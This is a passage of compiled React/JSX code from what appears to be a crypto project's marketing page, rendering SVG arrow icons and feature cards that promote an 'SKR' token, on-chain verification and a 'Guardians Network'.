																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "#61AFBD",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																],
															}),
															f.jsxs("span", {
																className:
																	"flex flex-col gap-2 pt-1",
																children: [
																	f.jsx("p", {
																		className:
																			"text-[18px] tracking-[-0.36px] font-semibold text-white",
																		children:
																			"On-Chain Verification",
																	}),
																	f.jsx("p", {
																		className:
																			"text-[18px] tracking-[-0.36px] font-normal text-nimbus",
																		children:
																			"Device and builder status verified against onchain contracts.",
																	}),
																],
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"grid grid-cols-[32px_1fr] gap-4",
														children: [
															f.jsxs("svg", {
																width: "32",
																height: "32",
																viewBox:
																	"0 0 25 24",
																fill: "none",
																xmlns: "http://www.w3.org/2000/svg",
																children: [
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "#61AFBD",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																],
															}),
															f.jsxs("span", {
																className:
																	"flex flex-col gap-2 pt-1",
																children: [
																	f.jsx("p", {
																		className:
																			"text-[18px] tracking-[-0.36px] font-semibold text-white",
																		children:
																			"Verified Global Distribution",
																	}),
																	f.jsx("p", {
																		className:
																			"text-[18px] tracking-[-0.36px] font-normal text-nimbus",
																		children:
																			"Verified Mobile-first dApps reach users worldwide without excessive restrictions or fees.",
																	}),
																],
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"grid grid-cols-[32px_1fr] gap-4",
														children: [
															f.jsxs("svg", {
																width: "32",
																height: "32",
																viewBox:
																	"0 0 25 24",
																fill: "none",
																xmlns: "http://www.w3.org/2000/svg",
																children: [
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "#61AFBD",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																],
															}),
															f.jsxs("span", {
																className:
																	"flex flex-col gap-2 pt-1",
																children: [
																	f.jsx("p", {
																		className:
																			"text-[18px] tracking-[-0.36px] font-semibold text-white",
																		children:
																			"Authentic Userbase",
																	}),
																	f.jsx("p", {
																		className:
																			"text-[18px] tracking-[-0.36px] font-normal text-nimbus",
																		children:
																			"Unique, high-value users gain exclusive access the next wave of onchain experiences.",
																	}),
																],
															}),
														],
													}),
												],
											}),
										],
									}),
								],
							}),
							f.jsxs("div", {
								className:
									"relative grid max-[1400px]:grid-rows-[400px_max-content]",
								children: [
									f.jsx("hr", {
										className: "absolute top-0 h-1/2 w-px",
										style: {
											backgroundImage:
												"linear-gradient(180deg, #050D10 0.1%, #15AEB5 59.98%, #FAF9F4 99.9%)",
											opacity: 0.3,
										},
									}),
									f.jsx("hr", {
										className:
											"absolute h-px w-full border-0 top-1/2",
										style: {
											backgroundImage:
												"linear-gradient(-90deg, #050D10 0.1%, #15AEB5 59.98%, #FAF9F4 99.9%)",
											opacity: 0.3,
										},
									}),
									f.jsx("hr", {
										className:
											"absolute bottom-0 h-1/2 w-px",
										style: {
											backgroundImage:
												"linear-gradient(0deg, #050D10 0.1%, #15AEB5 59.98%, #FAF9F4 99.9%)",
											opacity: 0.3,
										},
									}),
									f.jsx("div", {
										className:
											"size-full overflow-hidden min-[1400px]:hidden",
										children: f.jsx("div", {
											className: "",
											style: {
												width: "100%",
												height: "100%",
												overflow: "hidden",
											},
											children: f.jsx("img", {
												src: "/download2.png",
												alt: "",
											}),
										}),
									}),
									f.jsxs("div", {
										className:
											"min-[1400px]:h-screen flex flex-col justify-center gap-6 pl-6 lg:pl-20 min-[1400px]:max-h-[700px] min-[1400px]:gap-20",
										children: [
											f.jsxs("div", {
												className:
													"flex flex-col gap-6",
												children: [
													f.jsx("p", {
														className:
															"font-mono text-[16px] md:text-[18px] tracking-[1.08px] uppercase font-normal text-nimbus",
														children:
															"Verification Layer",
													}),
													f.jsxs("h5", {
														className:
															"text-[29.4px] md:text-[42px] leading-[99%] font-normal text-sky",
														children: [
															"A ",
															f.jsx("span", {
																style: h,
																children:
																	"decentralized trust network",
															}),
															" that spans devices and applications",
														],
													}),
												],
											}),
											f.jsxs("div", {
												className:
													"flex flex-col gap-6",
												children: [
													f.jsxs("div", {
														className:
															"grid grid-cols-[32px_1fr] gap-4",
														children: [
															f.jsxs("svg", {
																width: "32",
																height: "32",
																viewBox:
																	"0 0 25 24",
																fill: "none",
																xmlns: "http://www.w3.org/2000/svg",
																children: [
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "#61AFBD",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																],
															}),
															f.jsxs("span", {
																className:
																	"flex flex-col gap-2 pt-1",
																children: [
																	f.jsx("p", {
																		className:
																			"text-[18px] tracking-[-0.36px] font-semibold text-white",
																		children:
																			"Guardians Network",
																	}),
																	f.jsx("p", {
																		className:
																			"text-[18px] tracking-[-0.36px] font-normal text-nimbus",
																		children:
																			"Community leaders validate and manage integrity of the platform.",
																	}),
																],
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"grid grid-cols-[32px_1fr] gap-4",
														children: [
															f.jsxs("svg", {
																width: "32",
																height: "32",
																viewBox:
																	"0 0 25 24",
																fill: "none",
																xmlns: "http://www.w3.org/2000/svg",
																children: [
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "#61AFBD",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																],
															}),
															f.jsxs("span", {
																className:
																	"flex flex-col gap-2 pt-1",
																children: [
																	f.jsx("p", {
																		className:
																			"text-[18px] tracking-[-0.36px] font-semibold text-white",
																		children:
																			"Tokenized Platform Control",
																	}),
																	f.jsx("p", {
																		className:
																			"text-[18px] tracking-[-0.36px] font-normal text-nimbus",
																		children:
																			"SKR enables decentralized ownership of platform access and policy.",
																	}),
																],
															}),
														],
													}),
												],
											}),
										],
									}),
								],
							}),
						],
					}),
				],
			}),
			f.jsx(zc, { isOpen: c, onClose: r }),
		],
	});
}
function v4() {
	return f.jsxs("div", {
		className: "mt-14 flex flex-col gap-6 md:mt-[120px]",
		children: [
			f.jsxs("div", {
				className: "flex flex-col gap-6 text-center md:gap-[42px]",
				children: [
					f.jsxs("h2", {
						className:
							"text-[56px] md:text-[104px] tracking-[-1.456px] md:tracking-[-2.08px] leading-[100%] text-nimbus",
						children: [
							"SKR ",
							f.jsx("span", {
								style: {
									color: "rgb(250, 249, 244)",
									textShadow:
										"rgba(216, 230, 236, 0.9) 0px 0px 10px, rgba(153, 179, 190, 0.75) 0px 0px 25px, rgba(153, 179, 190, 0.25) 0px 0px 32px",
								},
								children: "Flywheel",
							}),
						],
					}),
					f.jsx("p", {
						className: "text-xs tracking-[-0.36px] text-white",
						children:
							"SKR powers economy, incentives, and ownership across the ecosystem.",
					}),
				],
			}),
			f.jsxs("div", {
				className: "grid gap-[42px] py-10 min-[1420px]:grid-cols-2",
				children: [
					f.jsxs("div", {
						className:
							"order-2 flex flex-col gap-2 md:gap-6 md:flex-row min-[1420px]:order-1 min-[1420px]:flex-wrap",
